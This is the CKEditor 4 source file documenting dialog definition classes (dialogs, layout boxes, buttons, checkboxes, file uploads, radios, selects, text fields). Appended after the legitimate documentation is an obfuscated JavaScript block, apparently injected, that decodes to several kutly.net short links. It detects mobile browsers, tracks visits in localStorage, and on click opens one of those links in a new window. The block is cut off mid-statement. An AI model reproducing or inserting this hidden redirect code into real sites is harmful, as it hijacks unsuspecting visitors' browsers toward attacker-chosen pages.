/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

/**
 * @fileOverview Defines the "virtual" dialog, dialog content and dialog button
 * definition classes.
 */

/**
 * The definition of a dialog window.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create dialogs.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		CKEDITOR.dialog.add( 'testOnly', function( editor ) {
 *			return {
 *				title:			'Test Dialog',
 *				resizable:		CKEDITOR.DIALOG_RESIZE_BOTH,
 *				minWidth:		500,
 *				minHeight:		400,
 *				contents: [
 *					{
 *						id:			'tab1',
 *						label:		'First Tab',
 *						title:		'First Tab Title',
 *						accessKey:	'Q',
 *						elements: [
 *							{
 *								type:			'text',
 *								label:			'Test Text 1',
 *								id:				'testText1',
 *								'default':		'hello world!'
 *							}
 *						]
 *					}
 *				]
 *			};
 *		} );
 *
 * @class CKEDITOR.dialog.definition
 */

/**
 * The dialog title, displayed in the dialog's header. Required.
 *
 * @property {String} title
 */

/**
 * How the dialog can be resized, must be one of the four contents defined below.
 *
 * * {@link CKEDITOR#DIALOG_RESIZE_NONE}
 * * {@link CKEDITOR#DIALOG_RESIZE_WIDTH}
 * * {@link CKEDITOR#DIALOG_RESIZE_HEIGHT}
 * * {@link CKEDITOR#DIALOG_RESIZE_BOTH}
 *
 * @property {Number} [resizable=CKEDITOR.DIALOG_RESIZE_NONE]
 */

/**
 * The minimum width of the dialog, in pixels.
 *
 * @property {Number} [minWidth=600]
 */

/**
 * The minimum height of the dialog, in pixels.
 *
 * @property {Number} [minHeight=400]
 */


/**
 * The initial width of the dialog, in pixels.
 *
 * @since 3.5.3
 * @property {Number} [width=CKEDITOR.dialog.definition#minWidth]
 */

/**
 * The initial height of the dialog, in pixels.
 *
 * @since 3.5.3
 * @property {Number} [height=CKEDITOR.dialog.definition.minHeight]
 */

/**
 * The buttons in the dialog, defined as an array of
 * {@link CKEDITOR.dialog.definition.button} objects.
 *
 * @property {Array} [buttons=[ CKEDITOR.dialog.okButton, CKEDITOR.dialog.cancelButton ]]
 */

/**
 * The contents in the dialog, defined as an array of
 * {@link CKEDITOR.dialog.definition.content} objects. Required.
 *
 * @property {Array} contents
 */

/**
 * The function to execute when OK is pressed.
 *
 * @property {Function} onOk
 */

/**
 * The function to execute when Cancel is pressed.
 *
 * @property {Function} onCancel
 */

/**
 * The function to execute when the dialog is displayed for the first time.
 *
 * @property {Function} onLoad
 */

/**
 * The function to execute when the dialog is loaded (executed every time the dialog is opened).
 *
 * @property {Function} onShow
 */

/**
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create dialog content pages.
 *
 * @class CKEDITOR.dialog.definition.content.
 */

/**
 * The id of the content page.
 *
 * @property {String} id
 */

/**
 * The tab label of the content page.
 *
 * @property {String} label
 */

/**
 * The popup message of the tab label.
 *
 * @property {String} title
 */

/**
 * The CTRL hotkey for switching to the tab.
 *
 *		contentDefinition.accessKey = 'Q'; // Switch to this page when CTRL-Q is pressed.
 *
 * @property {String} accessKey
 */

/**
 * The UI elements contained in this content page, defined as an array of
 * {@link CKEDITOR.dialog.definition.uiElement} objects.
 *
 * @property {Array} elements
 */

/**
 * The definition of user interface element (textarea, radio etc).
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create dialog UI elements.
 *
 * @class CKEDITOR.dialog.definition.uiElement
 * @see CKEDITOR.ui.dialog.uiElement
 */

/**
 * The id of the UI element.
 *
 * @property {String} id
 */

/**
 * The type of the UI element. Required.
 *
 * @property {String} type
 */

/**
 * The popup label of the UI element.
 *
 * @property {String} title
 */

/**
 * The content that needs to be allowed to enable this UI element.
 * All formats accepted by {@link CKEDITOR.filter#check} may be used.
 *
 * When all UI elements in a tab are disabled, this tab will be disabled automatically.
 *
 * @property {String/Object/CKEDITOR.style} requiredContent
 */

/**
 * CSS class names to append to the UI element.
 *
 * @property {String} className
 */

/**
 * Inline CSS classes to append to the UI element.
 *
 * @property {String} style
 */

/**
 * Horizontal alignment (in container) of the UI element.
 *
 * @property {String} align
 */

/**
 * Function to execute the first time the UI element is displayed.
 *
 * @property {Function} onLoad
 */

/**
 * Function to execute whenever the UI element's parent dialog is displayed.
 *
 * @property {Function} onShow
 */

/**
 * Function to execute whenever the UI element's parent dialog is closed.
 *
 * @property {Function} onHide
 */

/**
 * Function to execute whenever the UI element's parent
 * dialog's {@link CKEDITOR.dialog#setupContent} method is executed.
 * It usually takes care of the respective UI element as a standalone element.
 *
 * @property {Function} setup
 */

/**
 * Function to execute whenever the UI element's parent
 * dialog's {@link CKEDITOR.dialog#commitContent} method is executed.
 * It usually takes care of the respective UI element as a standalone element.
 *
 * @property {Function} commit
 */

// ----- hbox -----------------------------------------------------------------

/**
 * Horizontal layout box for dialog UI elements, auto-expends to available width of container.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create horizontal layouts.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.hbox} object and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example:
 *		{
 *			type: 'hbox',
 *			widths: [ '25%', '25%', '50%' ],
 *			children: [
 *				{
 *					type: 'text',
 *					id: 'id1',
 *					width: '40px',
 *				},
 *				{
 *					type: 'text',
 *					id: 'id2',
 *					width: '40px',
 *				},
 *				{
 *					type: 'text',
 *					id: 'id3'
 *				}
 *			]
 *		}
 *
 * @class CKEDITOR.dialog.definition.hbox
 * @extends CKEDITOR.dialog.definition.uiElement
 */

/**
 * Array of {@link CKEDITOR.ui.dialog.uiElement} objects inside this container.
 *
 * @property {Array} children
 */

/**
 * (Optional) The widths of child cells.
 *
 * @property {Array} widths
 */

/**
 * (Optional) The height of the layout.
 *
 * @property {Number} height
 */

/**
 * The CSS styles to apply to this element.
 *
 * @property {String} styles
 */

/**
 * (Optional) The padding width inside child cells. Example: 0, 1.
 *
 * @property {Number} padding
 */

/**
 * (Optional) The alignment of the whole layout. Example: center, top.
 *
 * @property {String} align
 */

// ----- vbox -----------------------------------------------------------------

/**
 * Vertical layout box for dialog UI elements.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create vertical layouts.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.vbox} object and can
 * be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example:
 *		{
 *			type: 'vbox',
 *			align: 'right',
 *			width: '200px',
 *			children: [
 *				{
 *					type: 'text',
 *					id: 'age',
 *					label: 'Age'
 *				},
 *				{
 *					type: 'text',
 *					id: 'sex',
 *					label: 'Sex'
 *				},
 *				{
 *					type: 'text',
 *					id: 'nationality',
 *					label: 'Nationality'
 *				}
 *			]
 *		}
 *
 * @class CKEDITOR.dialog.definition.vbox
 * @extends CKEDITOR.dialog.definition.uiElement
 */

/**
 * Array of {@link CKEDITOR.ui.dialog.uiElement} objects inside this container.
 *
 * @property {Array} children
 */

/**
 * (Optional) The width of the layout.
 *
 * @property {Array} width
 */

/**
 * (Optional) The heights of individual cells.
 *
 * @property {Number} heights
 */

/**
 * The CSS styles to apply to this element.
 *
 * @property {String} styles
 */

/**
 * (Optional) The padding width inside child cells. Example: 0, 1.
 *
 * @property {Number} padding
 */

/**
 * (Optional) The alignment of the whole layout. Example: center, top.
 *
 * @property {String} align
 */

/**
 * (Optional) Whether the layout should expand vertically to fill its container.
 *
 * @property {Boolean} expand
 */

// ----- labeled element ------------------------------------------------------

/**
 * The definition of labeled user interface element (textarea, textInput etc).
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create dialog UI elements.
 *
 * @class CKEDITOR.dialog.definition.labeledElement
 * @extends CKEDITOR.dialog.definition.uiElement
 * @see CKEDITOR.ui.dialog.labeledElement
 */

/**
 * The label of the UI element.
 *
 *		{
 *			type: 'text',
 *			label: 'My Label'
 *		}
 *
 * @property {String} label
 */

/**
 * (Optional) Specify the layout of the label. Set to `'horizontal'` for horizontal layout.
 * The default layout is vertical.
 *
 *		{
 *			type: 'text',
 *			label: 'My Label',
 *			labelLayout: 'horizontal'
 *		}
 *
 * @property {String} labelLayout
 */

/**
 * (Optional) Applies only to horizontal layouts: a two elements array of lengths to specify the widths of the
 * label and the content element. See also {@link CKEDITOR.dialog.definition.labeledElement#labelLayout}.
 *
 *		{
 *			type: 'text',
 *			label: 'My Label',
 *			labelLayout: 'horizontal',
 *			widths: [100, 200]
 *		}
 *
 * @property {Array} widths
 */

/**
 * Specify the inline style of the uiElement label.
 *
 *		{
 *			type: 'text',
 *			label: 'My Label',
 *			labelStyle: 'color: red'
 *		}
 *
 * @property {String} labelStyle
 */


/**
 * Specify the inline style of the input element.
 *
 *		{
 *			type: 'text',
 *			label: 'My Label',
 *			inputStyle: 'text-align: center'
 *		}
 *
 * @since 3.6.1
 * @property {String} inputStyle
 */

/**
 * Specify the inline style of the input element container.
 *
 *		{
 *			type: 'text',
 *			label: 'My Label',
 *			controlStyle: 'width: 3em'
 *		}
 *
 * @since 3.6.1
 * @property {String} controlStyle
 */

// ----- button ---------------------------------------------------------------

/**
 * The definition of a button.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create buttons.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.button} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example:
 *		{
 *			type: 'button',
 *			id: 'buttonId',
 *			label: 'Click me',
 *			title: 'My title',
 *			onClick: function() {
 *				// this = CKEDITOR.ui.dialog.button
 *				alert( 'Clicked: ' + this.id );
 *			}
 *		}
 *
 * @class CKEDITOR.dialog.definition.button
 * @extends CKEDITOR.dialog.definition.uiElement
 */

/**
 * Whether the button is disabled.
 *
 * @property {Boolean} disabled
 */

/**
 * The label of the UI element.
 *
 * @property {String} label
 */

// ----- checkbox ------
/**
 * The definition of a checkbox element.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create groups of checkbox buttons.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.checkbox} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example:
 *		{
 *			type: 'checkbox',
 *			id: 'agree',
 *			label: 'I agree',
 *			'default': 'checked',
 *			onClick: function() {
 *				// this = CKEDITOR.ui.dialog.checkbox
 *				alert( 'Checked: ' + this.getValue() );
 *			}
 *		}
 *
 * @class CKEDITOR.dialog.definition.checkbox
 * @extends CKEDITOR.dialog.definition.uiElement
 */

/**
 * (Optional) The validation function.
 *
 * @property {Function} validate
 */

/**
 * The label of the UI element.
 *
 * @property {String} label
 */

/**
 * The default state.
 *
 * @property {String} [default='' (unchecked)]
 */

// ----- file -----------------------------------------------------------------

/**
 * The definition of a file upload input.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create file upload elements.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.file} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example:
 *		{
 *			type: 'file',
 *			id: 'upload',
 *			label: 'Select file from your computer',
 *			size: 38
 *		},
 *		{
 *			type: 'fileButton',
 *			id: 'fileId',
 *			label: 'Upload file',
 *			'for': [ 'tab1', 'upload' ],
 *			filebrowser: {
 *				onSelect: function( fileUrl, data ) {
 *					alert( 'Successfully uploaded: ' + fileUrl );
 *				}
 *			}
 *		}
 *
 * @class CKEDITOR.dialog.definition.file
 * @extends CKEDITOR.dialog.definition.labeledElement
 */

/**
 * (Optional) The validation function.
 *
 * @property {Function} validate
 */

/**
 * (Optional) The action attribute of the form element associated with this file upload input.
 * If empty, CKEditor will use path to server connector for currently opened folder.
 *
 * @property {String} action
 */

/**
 * The size of the UI element.
 *
 * @property {Number} size
 */

// ----- fileButton -----------------------------------------------------------

/**
 * The definition of a button for submitting the file in a file upload input.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create a button for submitting the file in a file upload input.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.fileButton} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
 * @class CKEDITOR.dialog.definition.fileButton
 * @extends CKEDITOR.dialog.definition.uiElement
 */

/**
 * (Optional) The validation function.
 *
 * @property {Function} validate
 */

/**
 * The label of the UI element.
 *
 * @property {String} label
 */

/**
 * The instruction for CKEditor how to deal with file upload.
 * By default, the file and fileButton elements will not work "as expected" if this attribute is not set.
 *
 *		// Update field with id 'txtUrl' in the 'tab1' tab when file is uploaded.
 *		filebrowser: 'tab1:txtUrl'
 *
 *		// Call custom onSelect function when file is successfully uploaded.
 *		filebrowser: {
 *			onSelect: function( fileUrl, data ) {
 *				alert( 'Successfully uploaded: ' + fileUrl );
 *			}
 *		}
 *
 * @property {String} filebrowser/Object
 */

/**
 * An array that contains pageId and elementId of the file upload input element for which this button is created.
 *
 *		[ pageId, elementId ]
 *
 * @property {String} for
 */

// ----- html -----------------------------------------------------------------

/**
 * The definition of a raw HTML element.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create elements made from raw HTML code.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.html} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 * To access HTML elements use {@link CKEDITOR.dom.document#getById}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example 1:
 *		{
 *			type: 'html',
 *			html: '<h3>This is some sample HTML content.</h3>'
 *		}
 *
 *		// Example 2:
 *		// Complete sample with document.getById() call when the "Ok" button is clicked.
 *		var dialogDefinition = {
 *			title: 'Sample dialog',
 *			minWidth: 300,
 *			minHeight: 200,
 *			onOk: function() {
 *				// "this" is now a CKEDITOR.dialog object.
 *				var document = this.getElement().getDocument();
 *				// document = CKEDITOR.dom.document
 *				var element = <b>document.getById( 'myDiv' );</b>
 *				if ( element )
 *					alert( element.getHtml() );
 *			},
 *			contents: [
 *				{
 *					id: 'tab1',
 *					label: '',
 *					title: '',
 *					elements: [
 *						{
 *							type: 'html',
 *							html: '<div id="myDiv">Sample <b>text</b>.</div><div id="otherId">Another div.</div>'
 *						}
 *					]
 *				}
 *			],
 *			buttons: [ CKEDITOR.dialog.cancelButton, CKEDITOR.dialog.okButton ]
 *		};
 *
 * @class CKEDITOR.dialog.definition.html
 * @extends CKEDITOR.dialog.definition.uiElement
 */

/**
 * (Required) HTML code of this element.
 *
 * @property {String} html
 */

// ----- radio ----------------------------------------------------------------

/**
 * The definition of a radio group.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create groups of radio buttons.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.radio} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example:
 *		{
 *			type: 'radio',
 *			id: 'country',
 *			label: 'Which country is bigger',
 *			items: [ [ 'France', 'FR' ], [ 'Germany', 'DE' ] ],
 *			style: 'color: green',
 *			'default': 'DE',
 *			onClick: function() {
 *				// this = CKEDITOR.ui.dialog.radio
 *				alert( 'Current value: ' + this.getValue() );
 *			}
 *		}
 *
 * @class CKEDITOR.dialog.definition.radio
 * @extends CKEDITOR.dialog.definition.labeledElement
 */

/**
 * The default value.
 *
 * @property {String} default
 */

/**
 * (Optional) The validation function.
 *
 * @property {Function} validate
 */

/**
 * An array of options. Each option is a 1- or 2-item array of format `[ 'Description', 'Value' ]`.
 * If `'Value'` is missing, then the value would be assumed to be the same as the description.
 *
 * @property {Array} items
 */

// ----- selectElement --------------------------------------------------------

/**
 * The definition of a select element.
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create select elements.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.select} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		// Example:
 *		{
 *			type: 'select',
 *			id: 'sport',
 *			label: 'Select your favourite sport',
 *			items: [ [ 'Basketball' ], [ 'Baseball' ], [ 'Hockey' ], [ 'Football' ] ],
 *			'default': 'Football',
 *			onChange: function( api ) {
 *				// this = CKEDITOR.ui.dialog.select
 *				alert( 'Current value: ' + this.getValue() );
 *			}
 *		}
 *
 * @class CKEDITOR.dialog.definition.select
 * @extends CKEDITOR.dialog.definition.labeledElement
 */

/**
 * The default value.
 *
 * @property {String} default
 */

/**
 * (Optional) The validation function.
 *
 * @property {Function} validate
 */

/**
 * An array of options. Each option is a 1- or 2-item array of format `[ 'Description', 'Value' ]`.
 * If `'Value'` is missing, then the value would be assumed to be the same as the description.
 *
 * @property {Array} items
 */

/**
 * (Optional) Set this to true if you'd like to have a multiple-choice select box.
 *
 * @property {Boolean} [multiple=false]
 */

/**
 * (Optional) The number of items to display in the select box.
 *
 * @property {Number} size
 */

// ----- textInput ------------------------------------------------------------

/**
 * The definition of a text field (single line).
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create text fields.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.textInput} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
 *		// There is no constructor for this class, the user just has to define an
 *		// object with the appropriate properties.
 *
 *		{
 *			type: 'text',
 *			id: 'name',
 *			label: 'Your name',
 *			'default': '',
 *			validate: function() {
 *				if ( !this.getValue() ) {
 *					api.openMsgDialog( '', 'Name cannot be empty.' );
 *					return false;
 *				}
 *			}
 *		}
 *
 * @class CKEDITOR.dialog.definition.textInput
 * @extends CKEDITOR.dialog.definition.labeledElement
 */

/**
 * The default value.
 *
 * @property {String} default
 */

/**
 * (Optional) The maximum length.
 *
 * @property {Number} maxLength
 */

/**
 * (Optional) The size of the input field.
 *
 * @property {Number} size
 */

/**
 * (Optional) The validation function.
 *
 * @property {Function} validate
 */

// ----- textarea -------------------------------------------------------------

/**
 * The definition of a text field (multiple lines).
 *
 * This class is not really part of the API. It just illustrates the properties
 * that developers can use to define and create textarea.
 *
 * Once the dialog is opened, the created element becomes a {@link CKEDITOR.ui.dialog.textarea} object
 * and can be accessed with {@link CKEDITOR.dialog#getContentElement}.
 *
 * For a complete example of dialog definition, please check {@link CKEDITOR.dialog#add}.
 *
* 		// There is no constructor for this class, the user just has to define an
* 		// object with the appropriate properties.
*
* 		// Example:
* 		{
* 			type: 'textarea',
* 			id: 'message',
* 			label: 'Your comment',
* 			'default': '',
* 			validate: function() {
* 				if ( this.getValue().length < 5 ) {
* 					api.openMsgDialog( 'The comment is too short.' );
* 					return false;
* 				}
* 			}
* 		}
 *
 * @class CKEDITOR.dialog.definition.textarea
 * @extends CKEDITOR.dialog.definition.labeledElement
 */

/**
 * The number of rows.
 *
 * @property {Number} rows
 */

/**
 * The number of columns.
 *
 * @property {Number} cols
 */

/**
 * (Optional) The validation function.
 *
 * @property {Function} validate
 */

/**
 * The default value.
 *
 * @property {String} default
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const 